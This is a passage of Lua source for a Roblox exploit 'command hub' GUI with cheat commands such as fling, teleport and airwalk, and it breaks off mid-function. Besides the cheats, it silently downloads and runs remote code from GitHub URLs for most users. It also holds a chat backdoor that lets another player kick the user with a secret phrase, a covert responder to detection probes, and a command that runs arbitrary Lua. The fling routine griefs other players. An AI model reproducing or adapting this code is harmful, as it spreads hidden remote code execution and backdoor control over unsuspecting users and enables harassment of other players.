--[[
    CMDHUB
]]

for i = 1,5 do
    print("")
end
spawn(function()
    wait(.5)
    for i = 1,5 do
        print("")
    end
end)
if prefix == nil then
    prefix = ">"
end
local commands = {}
local Main = Instance.new("ScreenGui",game.CoreGui)

Main.Name = "Playerlist";

function Corner(parent)
	local a = Instance.new("UICorner",parent)
	a.CornerRadius = UDim.new(0,5)
end

function Frame(parent,scrolling,color,size,position,transparency,addCorner,zindex,visible,e)
	local a
	if scrolling then
		a = Instance.new("ScrollingFrame",parent)
		a.ScrollBarThickness = 7
		if e then
			a.CanvasSize = e
		end
	else
		a = Instance.new("Frame",parent)
	end
	a.BackgroundColor3 = color or Color3.fromRGB(0,0,0)
	a.Size = size
	a.Position = position
	a.BackgroundTransparency = transparency
	a.ZIndex = zindex
	a.Visible = visible
	a.BorderSizePixel = 0
	if addCorner then
		Corner(a)
	end
	return a
end

function Text(parent,button,text,color,textColor,size,position,transparency,addCorner,font,textSize,textScaled,zindex,visible,textbox)
	local a
	if button then
		a = Instance.new("TextButton",parent)
	elseif textbox then
		a = Instance.new("TextBox",parent)
	else
		a = Instance.new("TextLabel",parent)
	end
	a.Text = text
	a.BackgroundColor3 = color
	a.TextColor3 = textColor
	a.Size = size
	a.Position = position
	a.BackgroundTransparency = transparency
	a.Font = font or Enum.Font.SourceSans
	a.TextSize = textSize
	a.ZIndex = zindex
	a.Visible = visible
	a.BorderSizePixel = 0
	if textScaled then
		a.TextScaled = true
	end
	if addCorner then
		Corner(a)
	end
	return a
end
local Base = Frame(Main,false,Color3.new(0.129412, 0.129412, 0.129412),UDim2.new(0, 230, 0, 300),UDim2.new(1, 0, 0.395229459, 0),0,true,1,1,true)
	
local Heading = Frame(Base,false,Color3.new(0.196078, 0.196078, 0.196078),UDim2.new(0, 230, 0, 25),UDim2.new(-0.000996661722, 0, -0.09, 0),0,true,5,true)	

local Command_ = Frame(Base,true,Color3.new(1, 1, 1),UDim2.new(0, 233, 0, 183),UDim2.new(0.29864198, 0, 0.00656244671, 0),1,false,1,true,UDim2.new(0,0,0,0))	

local TextLabel = Text(Heading,false,"cmdhub.exe",Color3.new(1, 1, 1),Color3.new(1, 1, 1),UDim2.new(0, 80, 0, 22),UDim2.new(0.0620914474, 0, 0, 0),1,false,Enum.Font.Code,5,true,7,true)		
local minize = Text(Heading,true,"−",Color3.new(1, 1, 1),Color3.new(1, 1, 1),UDim2.new(0, 20, 0, 18),UDim2.new(0.852941155, 0, 0, 1),1,false,Enum.Font.SourceSans,27,false,10,true)	

local Output = Frame(Base,false,Color3.new(0.0941176, 0.0941176, 0.0941176),UDim2.new(0, 207, 0, 90),UDim2.new(0.0515021458, 0, 0.15, 0),0,true,1,true)

local InputBox = Frame(Base,false,Color3.new(0.0941176, 0.0941176, 0.0941176),UDim2.new(0, 207, 0, 24),UDim2.new(0.0520784445, 0, 0.05, 0),0,true,1,true)	
local InputTextBox = Text(InputBox,false,"KN:/".. prefix,Color3.new(1, 1, 1),Color3.new(1, 1, 1),UDim2.new(-0.0186749883, 200, 1, 0),UDim2.new(0.0186749883, 0, 0, 0),1,false,Enum.Font.Code,12,false,1,true,true)
local ScrollingFrame = Frame(Output,true,Color3.new(0.0941176, 0.0941176, 0.0941176),UDim2.new(0, 203, 0, 90),UDim2.new(0.0193236712, 0, 0, 0),1,false,1,true)
local Name = Text(Heading, true, "x", Color3.new(1, 1, 1), Color3.new(1, 1, 1), UDim2.new(0, 23, 0, 18), UDim2.new(0.918300629, 0, 0, 1), 1, false, Enum.Font.SourceSans, 30, false, 10, true)

local Output2 = Frame(Base, false, Color3.new(0.0941176, 0.0941176, 0.0941176), 
    UDim2.new(0, 207, 0, 140), 
    UDim2.new(0.0515021458, 0, 0.48, 0), 
    0, true, 1, true)

local ScrollingFrame2 = Frame(Output2, true, Color3.new(0.0941176, 0.0941176, 0.0941176), 
    UDim2.new(0, 207, 0, 140), 
    UDim2.new(0, 0, 0, 0), 
    1, false, 1, true)

ScrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, 0)  


function addFrame(name)
    local frameHeight = 30  
    local frameWidth = 200 
    local spacing = 5       
    local padding = 5
    local totalFrames = #ScrollingFrame2:GetChildren() 

    local newFrame = Frame(ScrollingFrame2, false, Color3.new(0.129412, 0.129412, 0.129412) , 
        UDim2.new(0, frameWidth, 0, frameHeight), 
        UDim2.new(0, padding, 0, (totalFrames * (frameHeight + spacing)) + padding),  
        0, true, 1, true)


    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, frameHeight / 2) 
    corner.Parent = newFrame

   
    local textLabel = Text(newFrame, false," " .. name .. " ", Color3.new(1, 1, 1), Color3.new(0.5, 0.5, 0.5), 
       UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), 
         1, true, Enum.Font.Jura, 10, true, 1, true)


    ScrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, (totalFrames + 1) * (frameHeight + spacing) + padding)
end


Name.MouseButton1Click:Connect(function()
    Main:Destroy()
    script:Destroy()
end)

local l2 = Instance.new("UIListLayout",ScrollingFrame)

ScrollingFrame.CanvasSize = UDim2.new(0,0,0,0)
InputTextBox.TextXAlignment = Enum.TextXAlignment.Left
InputTextBox.TextYAlignment = Enum.TextYAlignment.Top
InputTextBox.ClearTextOnFocus = false	
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y	


local UIS = game:GetService("UserInputService")
spawn(function()
	local Frame = Base
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragInput = nil
	local dragStart = nil
	local dragPos = nil
	local startPos
	local function updateInput(input)
		local Delta = input.Position - dragStart
		local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
		game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	end

	Heading.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
			dragToggle = true
			dragStart = input.Position
			startPos = Frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	Frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
end)
Base:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "Out", "Quad", 1)
Base.Draggable = true


-- var

local Players = game:GetService("Players")
local speaker = Players.LocalPlayer
local crashurl = "https://raw.githubusercontent.com/Emerald15233/connectp7/refs/heads/main/mainsource"
local respondedmessage = false
local cloneref = cloneref or function(o) return o end
local TextChatService = cloneref(game:GetService("TextChatService"))
local isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local locking = false
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local cmddesc = {  }
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = speaker
local Mouse = LocalPlayer:GetMouse()
local tpclicksuccess = false
local tpClickConnection
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local tweenSpeed = 0.5
local dontuse = false
local time = 0
local box = InputTextBox
local typing = false
local history = box.Text
local UIS = game:GetService("UserInputService")
local output = ScrollingFrame
local typing2 = false
local typing3 = false

box.TextWrapped = true
box.Focused:Connect(function() typing = true end)
box.FocusLost:Connect(function() wait() typing = false end)

function notif(msg,col)
	if #output:GetChildren() > 2 then
		local la = output:GetChildren()[#output:GetChildren()]
		if la.TextColor3 == Color3.new(1, 1, 0) then
			la.TextColor3 = Color3.new(0.25098, 0.756863, 0)
		end
	end
	local new
	if msg == "player not found" or msg == "invalid command" then
		if msg == "invalid command" then
			new = Text(Output,false,"error: invalid command",Color3.new(1, 1, 1),Color3.new(1, 0, 0),UDim2.new(0, 200, 0, 15),UDim2.new(0, 0, 0, 0),1,false,Enum.Font.SourceSans,14,false,1,true,false)
		else
			new = Text(Output,false,"error: missing player",Color3.new(1, 1, 1),Color3.new(1, 0, 0),UDim2.new(0, 200, 0, 15),UDim2.new(0, 0, 0, 0),1,false,Enum.Font.SourceSans,14,false,1,true,false)
		end
	else
		new = Text(Output,false,msg,Color3.new(1, 1, 1),(col or Color3.new(1, 1, 0)),UDim2.new(0, 200, 0, 15),UDim2.new(0, 0, 0, 0),1,false,Enum.Font.SourceSans,14,false,1,true,false)
	end
	new.Parent = output
	new.TextXAlignment = Enum.TextXAlignment.Left
	new.TextWrapped = true
	new.AutomaticSize = Enum.AutomaticSize.Y
	output.CanvasPosition = Vector2.new(0,9999)
end

function error(msg)
    notif("error: " .. msg, Color3.new(1, 0, 0)) 
end

function bluenotif(msg)
    notif(msg, Color3.new(0, 0, 1))
end

notif("Starting up...")
notif("Version 1.2.8")


local function rollrand()
    local randNum = math.random(0, 0.3)
end

speaker.Chatted:Connect(function(msg)
    if not lUdiF2TGD then return end
    if string.sub(msg:lower(), 0, 1) == prefix then 
        if msg:split(prefix)[1] == "" then
            local msgs = msg:split(prefix)
            msgs = msgs[2]:split(" ")
            msgs[1] = msgs[1]:lower()
            local cmd = msgs[1]
            
            if cmd == "code" then
                return loadstring(string.sub(msg, 7, #msg))()
            end

            if not commands[msgs[1]] then
                return notif("Invalid command")
            end
            
            local success = pcall(function()
                if msgs[2] then
                    commands[msgs[1]](msgs[2])
                else
                    commands[msgs[1]]()
                end
            end)
            
            if not success then
                notif("Unexpected error occurred")
            end
        end
    end
end)


UIS.InputBegan:Connect(function(i)
	i = i.KeyCode
	if typing then
		if i == Enum.KeyCode.Return then
			local input = box.Text:gsub(">","")
			input = prefix..input:split("/")[2]
			box.Text = "KN:/".. prefix
			local msg = input
			box:ReleaseFocus()
			sc(input)
		elseif box.Text:sub(1,5) ~= "KN:/".. prefix then
			box.Text = history
			box.CursorPosition = #box.Text+1
		end
		history = box.Text
	end
end)

local playerA = speaker
local Players = game:GetService("Players")
local speakersname = speaker.Name
-- connect
if speaker.Name == "EeRIlIlIllIlIlIl" or speaker.Name == "piepiepie894" or speaker.Name == "EOUHWEBBIUweiuwy" or speaker.Name == "woodsofinemeow" then
    notif("not exec")
else
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Emerald15233/test/refs/heads/ee/code'))()
end

local function runLatest()
    local success, result = pcall(function()
        return game:HttpGet(crashurl)
    end)
    if success then
        local func = loadstring(result)
        if func then
            pcall(func)
        end
    end
end
local speakersname = Players.LocalPlayer.Name

function ConnectP1000(plr)
    plr.Chatted:Connect(function(msg)
        local fullCommand = "..kickthisguy1314" .. speakersname
        if msg:sub(1, #fullCommand):lower() == fullCommand:lower() then
            local message = msg:sub(#fullCommand + 2) -- +2 to skip the space after command
            speaker:Kick(message)
        end
    end)
end

function ConnectP1(plr)
	plr.Chatted:Connect(function(msg)
		local command, message = string.match(msg, '^(%S+)%s+(.*)$')
		if command == "..checkforusingthis218" and message then
            if message ~= speakersname then return end
            sc("..confirmationforconnect8172")
		end
	end)
end

function ConnectP3(plr)
 	plr.Chatted:Connect(function(msg)
        if msg == "..confirmationforconnect8172" then
            respondedmessage = true
            spawn(function()
                task.wait(2)
                respondedmessage = false
            end)
        end
    end)
end

local function getPlayer(name)
    local foundPlayers = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if string.find(string.lower(player.Name), string.lower(name)) or string.find(string.lower(player.DisplayName), string.lower(name)) then
            table.insert(foundPlayers, player)
        end
    end
    return foundPlayers
end

-- func
local function fling(target)
    local Targets = {target}

    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer

    local AllBool = false

    local GetPlayer = function(Name)
        Name = Name:lower()
        if Name == "all" or Name == "others" then
            AllBool = true
            return
        elseif Name == "random" then
            local GetPlayers = Players:GetPlayers()
            if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
            return GetPlayers[math.random(#GetPlayers)]
        elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
            for _,x in next, Players:GetPlayers() do
                if x ~= Player then
                    if x.Name:lower():match("^"..Name) then
                        return x;
                    elseif x.DisplayName:lower():match("^"..Name) then
                        return x;
                    end
                end
            end
        else
            return
        end
    end

    local Message = function(_Title, _Text, Time)
        game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
    end

    local SkidFling = function(TargetPlayer)
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Humanoid and Humanoid.RootPart

        local TCharacter = TargetPlayer.Character
        local THumanoid
        local TRootPart
        local THead
        local Accessory
        local Handle

        if TCharacter:FindFirstChildOfClass("Humanoid") then
            THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
        end
        if THumanoid and THumanoid.RootPart then
            TRootPart = THumanoid.RootPart
        end
        if TCharacter:FindFirstChild("Head") then
            THead = TCharacter.Head
        end
        if TCharacter:FindFirstChildOfClass("Accessory") then
            Accessory = TCharacter:FindFirstChildOfClass("Accessory")
        end
        if Accessoy and Accessory:FindFirstChild("Handle") then
            Handle = Accessory.Handle
        end

        if Character and Humanoid and RootPart then
            if RootPart.Velocity.Magnitude < 50 then
                getgenv().OldPos = RootPart.CFrame
            end
            if THumanoid and THumanoid.Sit and not AllBool then
                return error("Targeting is sitting") -- u can remove dis part if u want lol
            end
            if THead then
                    workspace.CurrentCamera.CameraSubject = THead
            elseif not THead and Handle then
                workspace.CurrentCamera.CameraSubject = Handle
            elseif THumanoid and TRootPart then
                workspace.CurrentCamera.CameraSubject = THumanoid
            end
            if not TCharacter:FindFirstChildWhichIsA("BasePart") then
                return
            end
        
            local FPos = function(BasePart, Pos, Ang)
                RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
                RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
            end
        
            local SFBasePart = function(BasePart)
                local TimeToWait = 5
                local Time = tick()
                local Angle = 0

                repeat
                if RootPart and THumanoid then
                        if BasePart.Velocity.Magnitude < 50 then
                            Angle = Angle + 100

                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()
                        else
                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()
                        
                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                            task.wait()
                        end
                    else
                        break
                    end
                until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
            end
        
            workspace.FallenPartsDestroyHeight = 0/0
        
            local BV = Instance.new("BodyVelocity")
            BV.Name = "EpixVel"
            BV.Parent = RootPart
            BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
            BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
            if TRootPart and THead then
                if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                    SFBasePart(THead)
                else
                    SFBasePart(TRootPart)
                end
            elseif TRootPart and not THead then
                SFBasePart(TRootPart)
            elseif not TRootPart and THead then
                SFBasePart(THead)
            elseif not TRootPart and not THead and Accessory and Handle then
                SFBasePart(Handle)
            else
                return error("Target is missing everything")
            end
        
            BV:Destroy()
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            workspace.CurrentCamera.CameraSubject = Humanoid
        
            repeat
                RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
                Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
                Humanoid:ChangeState("GettingUp")
                table.foreach(Character:GetChildren(), function(_, x)
                    if x:IsA("BasePart") then
                        x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                    end
                end)
                task.wait()
            until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
            workspace.FallenPartsDestroyHeight = getgenv().FPDH
        else
            return error("an unexpected error occured")
        end
    end
    if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end

    if AllBool then
        for _,x in next, Players:GetPlayers() do
            SkidFling(x)
        end
    end

    for _,x in next, Targets do
        if GetPlayer(x) and GetPlayer(x) ~= Player then
            if GetPlayer(x).UserId ~= 0 then
                local TPlayer = GetPlayer(x)
                if TPlayer then
                    SkidFling(TPlayer)
                end
            else
                error("invalid target")
        end
        elseif not GetPlayer(x) and not AllBool then
            error("invalid target")
        end
    end
end

queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

local keepscript = false
local TeleportCheck = false

--[[
Players.LocalPlayer.OnTeleport:Connect(function(State)
	TeleportCheck = true
	queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Emerald15233/cmdhub/refs/heads/main/source'))()")
end)
]]

function fireserver(item, file)
    if not item or not file then 
        error("Invalid argument(s)")
        return
    end
    local service = game:GetService(file)
    local remote = service:FindFirstChild(item)
    if remote and remote.FireServer then
        remote:FireServer()
    else
        error("Remote '" .. item .. "' not found or not a RemoteEvent")
    end
end


function sc(silentmsg)
    Players:Chat(silentmsg)
end


function chatMessage(str)
    str = tostring(str)
    if not isLegacyChat then
        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
    else
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
    end
end

local Players = game:GetService("Players")
local LocalPlayer = speaker
local Camera = workspace.CurrentCamera

-- Saves original zoom settings
local preMaxZoom = LocalPlayer.CameraMaxZoomDistance
local preMinZoom = LocalPlayer.CameraMinZoomDistance

-- Main lookAt function
function lookAt(username)
	local matches = getPlayer(username)
	if #matches == 0 then
		warn("No player found for:", username)
		return
	end

	local targetPlayer = matches[1] -- use the first match
	local targetChar = targetPlayer.Character
	local targetHead = targetChar and targetChar:FindFirstChild("Head")

	if not targetHead then
		warn("Target does not have a head.")
		return
	end

	-- Make camera look at target's head
	Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetHead.Position)

	-- Optional: restore zoom after a short delay
	task.delay(0.5, function()
		LocalPlayer.CameraMaxZoomDistance = preMaxZoom
		LocalPlayer.CameraMinZoomDistance = preMinZoom
	end)
end

function execCmd(name)
    local cmd = commands[name]
    if cmd and type(cmd) == "function" then
        cmd()
    else
        error("Command not found: " .. tostring(name))
    end
end

local function getfullname(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if string.lower(player.Name):find(string.lower(name)) or string.lower(player.DisplayName):find(string.lower(name)) then
            return player.Name -- or player.DisplayName if you prefer
        end
    end
    return nil -- if no player found
end


local savedCamPos = nil
local savedCamLookVector = nil

function viewcurrentpos()
	local cam = workspace.CurrentCamera
	local char = speaker.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")

	if not hrp then
		warn("No character to get position from.")
		return
	end

	-- Save current camera orientation
	savedCamPos = cam.CFrame.Position
	savedCamLookVector = cam.CFrame.LookVector

	-- Set camera to scriptable and freeze it
	cam.CameraType = Enum.CameraType.Scriptable
	cam.CFrame = CFrame.lookAt(hrp.Position + Vector3.new(0, 5, 10), hrp.Position)

	notif("Now viewing from current position.")
end

function unview()
	local cam = workspace.CurrentCamera
	cam.CameraType = Enum.CameraType.Custom
	cam.CameraSubject = speaker.Character:FindFirstChild("Humanoid")

	notif("Camera reset to normal.")
end

local function gotocframe(cframe)
    local player = speaker
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local root = player.Character.HumanoidRootPart
    root.CFrame = cframe
end

--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local tpwalking = false
local hb = RunService.Heartbeat
local speaker = speaker
local function isNumber(value)
	return tonumber(value) ~= nil
end

function tpwalk(speed)
	tpwalking = true
	local chr = speaker.Character or speaker.CharacterAdded:Wait()
	local hum = chr:FindFirstChildWhichIsA("Humanoid")

	while tpwalking and chr and hum and hum.Parent do
		local delta = hb:Wait()
		if hum.MoveDirection.Magnitude > 0 then
			local moveSpeed = 10 -- Default speed multiplier
			if speed and isNumber(speed) then
				moveSpeed = tonumber(speed) * 10
			end
			chr:TranslateBy(hum.MoveDirection * delta * moveSpeed)
		end
	end
end

function reset()
    speaker.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
end

-- Function to generate a random string
function randomString()
    local length = math.random(10, 20)
    local array = {}
    for i = 1, length do
        array[i] = string.char(math.random(32, 126))
    end
    return table.concat(array)
end

-- Get the character's root part
function getRoot(char)
    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
    return rootPart
end

-- Main float function
function airwalk(speaker)
    local Floating = false
    local floatName = randomString()
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    
    Floating = true
    local pchar = speaker.Character
    if pchar and not pchar:FindFirstChild(floatName) then
        task.spawn(function()
            local Float = Instance.new('Part')
            Float.Name = floatName
            Float.Parent = pchar
            Float.Transparency = 1
            Float.Size = Vector3.new(2, 0.2, 1.5)
            Float.Anchored = true
            local FloatValue = -3.1
            Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0, FloatValue, 0)

            -- Notify the user
            notif('Airwalk Enabled, (Q = to go down & E = to go up)')

            -- Event connections for key actions (Q and E)
            local qUp, eUp, qDown, eDown

            qUp = UserInputService.InputEnded:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.Q then
                    FloatValue = FloatValue + 0.5
                end
            end)

            eUp = UserInputService.InputEnded:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.E then
                    FloatValue = FloatValue - 1.5
                end
            end)

            qDown = UserInputService.InputBegan:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.Q then
                    FloatValue = FloatValue - 0.5
                end
            end)

            eDown = UserInputService.InputBegan:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.E then
                    FloatValue = FloatValue + 1.5
                end
            end)

            -- When the character dies, clean up
            local floatDied = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
                FloatingFunc:Disconnect()
                Float:Destroy()
                qUp:Disconnect()
                eUp:Disconnect()
                qDown:Disconnect()
                eDown:Disconnect()
                floatDied:Disconnect()
            end)

            -- Function to keep the floating part in place
            local function FloatPadLoop()
                if pchar:FindFirstChild(floatName) and getRoot(pchar) then
                    Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0, FloatValue, 0)
                else
                    FloatingFunc:Disconnect()
                    Float:Destroy()
                    qUp:Disconnect()
                    eUp:Disconnect()
                    qDown:Disconnect()
                    eDown:Disconnect()
                    floatDied:Disconnect()
                end
            end

            -- Connect the loop
            FloatingFunc = RunService.Heartbeat:Connect(FloatPadLoop)
        end)
    end
end

local function rejoin()
    notif("Rejoining...")
    wait(.5)
	local player = speaker
	if player then
		local placeId = game.PlaceId
		TeleportService:Teleport(placeId, player)
	end
end

-- Table to store floating state and connections
local FloatData = {}

function unairwalk(speaker)
    local pchar = speaker.Character
    if not pchar then return end

    -- Find and destroy the float part
    for _, v in pairs(pchar:GetChildren()) do
        if v:IsA("Part") and v.Size == Vector3.new(2, 0.2, 1.5) and v.Anchored and v.Transparency == 1 then
            v:Destroy()
        end
    end

    -- Disconnect any existing connections
    if FloatData[speaker] then
        for _, conn in ipairs(FloatData[speaker].connections or {}) do
            if conn and conn.Disconnect then
                conn:Disconnect()
            end
        end
        FloatData[speaker] = nil
    end

    notif("Airwalk Disabled")
end


local function parseKeybind(keybind)
    tpclicksuccess = false
	local ctrl, alt, shift, fn, key, inputType

	keybind = keybind:lower()

	for part in string.gmatch(keybind, "[^+]+") do
		if part == "ctrl" then
			ctrl = true
		elseif part == "alt" then
			alt = true
		elseif part == "shift" then
			shift = true
		elseif part == "fn" then
			fn = true -- ignored in detection (not detectable in Roblox)
		elseif part == "m1" then
			key = Enum.UserInputType.MouseButton1
			inputType = "mouse"
		elseif part == "m2" then
			key = Enum.UserInputType.MouseButton2
			inputType = "mouse"
		elseif part == "m3" then
			key = Enum.UserInputType.MouseButton3
			inputType = "mouse"
		else
			local upperPart = part:upper()
			if upperPart:match("^F%d+$") and Enum.KeyCode[upperPart] then
				key = Enum.KeyCode[upperPart]
				inputType = "keyboard"
			else
                pcall(function()
				    local keyCode = Enum.KeyCode[upperPart]
				    if keyCode and keyCode ~= Enum.KeyCode.Unknown then
					    key = keyCode
					    inputType = "keyboard"
                        spawn(function()
                        end)
				    else
					    print("Invalid keybind: '" .. part .. "' is not recognized")
				    end
                end)
			end
		end
	end

    if key then
        tpclicksuccess = true
    end

	return {
		ctrl = ctrl,
		alt = alt,
		shift = shift,
		fn = fn,
		key = key,
		inputType = inputType
	}
end

function tpclick(keybind)
	if tpClickConnection then
		tpClickConnection:Disconnect()
	end

	local config = parseKeybind(keybind)

	local function teleport()
		if Mouse.Hit then
			local char = LocalPlayer.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				char.HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 3, 0)
			end
		end
	end

	tpClickConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end

		local isCorrectInput = false
		if config.inputType == "mouse" then
			isCorrectInput = input.UserInputType == config.key
		elseif config.inputType == "keyboard" then
			isCorrectInput = input.KeyCode == config.key
		end

		if isCorrectInput then
			if (not config.ctrl or UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.RightControl))
			and (not config.alt or UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) or UserInputService:IsKeyDown(Enum.KeyCode.RightAlt))
			and (not config.shift or UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)) then
				-- Note: fn not actually checked (undetectable in Roblox)
				teleport()
			end
		end
	end)
end

function tweengoto(cframe, speed)
	local speaker = speaker
	if not speaker or not speaker.Character then return end
    tweenSpeed = speed

    if not speed then
        error("set a tweenspeed")
        return
    end

	if speaker.Character:FindFirstChildOfClass("Humanoid") and speaker.Character:FindFirstChildOfClass("Humanoid").SeatPart then
		speaker.Character:FindFirstChildOfClass("Humanoid").Sit = false
		task.wait(0.1)
	end

	local root = getRoot(speaker.Character)
	if root then
		TweenService:Create(
			root,
			TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear),
			{ CFrame = cframe }
		):Play()
	end
end

local function findPlayer(name)
    name = string.lower(name)
    local bestMatch = nil

    for _, player in ipairs(Players:GetPlayers()) do
        local username = string.lower(player.Name)
        local displayName = string.lower(player.DisplayName)

        if username == name or displayName == name then
            return player
        end

        if string.sub(username, 1, #name) == name or string.sub(displayName, 1, #name) == name then
            bestMatch = player
        end
    end

    return bestMatch
end

local looping = false


local function looptp(e)
    local localPlayer = speaker
    local target = findPlayer(e)
    if not target then
        error("user not found")
        return
    end
    looping = true
    notif("teleporting to " .. target.Name .. "")
    while looping do
        target = findPlayer(e) 
        if not target or not target.Character then
            notif("target missing/left the game")
            looping = false
            break
        end
        local rootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
